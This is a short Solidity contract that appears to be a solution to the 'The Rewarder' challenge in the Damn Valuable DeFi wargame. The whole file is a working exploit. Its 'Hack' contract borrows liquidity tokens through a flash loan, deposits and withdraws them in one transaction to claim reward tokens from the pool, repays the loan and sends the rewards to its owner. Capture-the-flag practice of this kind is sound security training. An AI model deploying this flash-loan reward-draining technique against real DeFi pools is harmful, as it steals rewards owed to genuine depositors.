// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "../DamnValuableToken.sol";
import "./TheRewarderPool.sol";

interface IFlashLoanerPool {
    function flashLoan(uint256) external;
}

contract Hack {
    address public owner;
    IFlashLoanerPool public immutable Flash;
    DamnValuableToken public immutable liquidityToken;
    TheRewarderPool public immutable RewarderPool;
    RewardToken public immutable rewardToken;

    constructor(
        address _flash,
        address liquidityTokenAddress,
        address rewarderPoolAddress,
        address rewardTokenAddress
    ) {
        owner = msg.sender;
        Flash = IFlashLoanerPool(_flash);
        liquidityToken = DamnValuableToken(liquidityTokenAddress);
        RewarderPool = TheRewarderPool(rewarderPoolAddress);
        rewardToken = RewardToken(rewardTokenAddress);
    }

    function hack(uint256 _val) external {
        require(owner == msg.sender, "only owner");
        Flash.flashLoan(_val);
        rewardToken.transfer(owner, rewardToken.balanceOf(address(this)));
    }

    function receiveFlashLoan(uint256 _val) external {
        require(address(Flash) == msg.sender, "only flash loan");
        liquidityToken.approve(address(RewarderPool), _val);
        RewarderPool.deposit(_val);
        RewarderPool.withdraw(_val);
        liquidityToken.transfer(address(Flash), _val);
    }
}
